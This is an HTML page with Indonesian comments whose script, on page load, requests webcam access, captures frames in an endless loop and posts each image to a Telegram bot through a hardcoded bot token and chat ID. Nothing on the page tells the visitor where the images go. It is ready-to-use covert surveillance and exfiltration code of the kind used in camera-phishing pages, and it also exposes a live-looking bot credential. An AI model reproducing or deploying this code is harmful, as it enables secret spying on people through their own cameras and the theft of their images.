<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Automatic Camera Capture and Telegram</title>
</head>
<body>
  <h1>Automatic Camera Capture and Telegram</h1>

  <script>
    var token = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0'; // Ganti dengan token bot Telegram Anda
    var chatId = '-1002188815934';   // Ganti dengan ID obrolan atau pengguna di -1002188815934
    // Fungsi untuk mengirim gambar ke Telegram
    function sendToTelegram(imageDataURL) {
      // API endpoint untuk mengirim pesan gambar
      var apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;

      // Mengubah data URL menjadi Blob
      fetch(imageDataURL)
        .then(res => res.blob())
        .then(blob => {
          // Buat form data untuk POST request
          var formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', blob, 'photo.png'); // Nama file disertakan untuk photo

          // Kirim POST request menggunakan fetch API
          return fetch(apiUrl, {
            method: 'POST',
            body: formData
          });
        })
        .then(response => response.json())
        .then(data => {
          console.log('Gambar berhasil dikirim ke Telegram:', data);
          // Lanjutkan pengambilan gambar berikutnya setelah berhasil dikirim
          takeAndSendPhoto();
        })
        .catch(error => {
          console.error('Error mengirim gambar ke Telegram:', error);
          // Coba kirim gambar berikutnya setelah terjadi kesalahan
          takeAndSendPhoto();
        });
    }

    // Fungsi untuk mengambil dan mengirim foto ke Telegram secara berulang
    function takeAndSendPhoto() {
      // Mendapatkan akses ke kamera pengguna secara otomatis
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          var video = document.createElement('video');
          document.body.appendChild(video);
          video.srcObject = stream;
          video.onloadedmetadata = function(e) {
            video.play();

            // Mengambil gambar setelah izin diberikan
            setTimeout(function() {
              var canvas = document.createElement('canvas');
              var context = canvas.getContext('2d');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              context.drawImage(video, 0, 0, canvas.width, canvas.height);

              // Mengambil data gambar dalam bentuk base64
              var imageDataURL = canvas.toDataURL('image/png');

              // Kirim gambar ke fungsi untuk mengirim ke Telegram
              sendToTelegram(imageDataURL);

              // Hapus elemen video dari dokumen
              video.parentNode.removeChild(video);

              // Panggil fungsi lagi untuk mengambil foto berikutnya
              takeAndSendPhoto();
            }, 1000); // Waktu delay sebelum mengambil gambar (dalam milidetik)
          };
        })
        .catch(function(err) {
          console.log("Error: " + err);
          // Coba kembali mengambil gambar jika terjadi kesalahan
          takeAndSendPhoto();
        });
    }

    // Memulai proses pengambilan dan pengiriman foto pertama kali
    takeAndSendPhoto();
  </script>
</body>
</html>
